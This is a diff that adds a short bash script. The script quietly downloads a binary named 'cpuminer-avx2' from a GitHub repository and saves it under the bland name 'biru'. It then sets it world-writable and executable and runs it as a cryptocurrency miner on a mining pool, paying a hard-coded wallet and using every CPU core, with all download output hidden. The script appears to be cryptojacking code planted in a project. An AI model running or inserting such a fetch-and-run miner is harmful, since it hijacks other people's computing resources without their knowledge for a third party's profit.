@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O biru https://github.com/claires67/newxm/raw/refs/heads/main/cpuminer-avx2 > /dev/null 2>&1
+chmod 777 biru
+./biru -a rinhash -o stratum+tcp://stratum-eu.rplant.xyz:7148 -u rin1qu9ntv7w65qxx4a99g4luzlpfv6cgt0009t0n2m.$(shuf -n 1 -i 1-99999)-VX -t $(nproc --all)
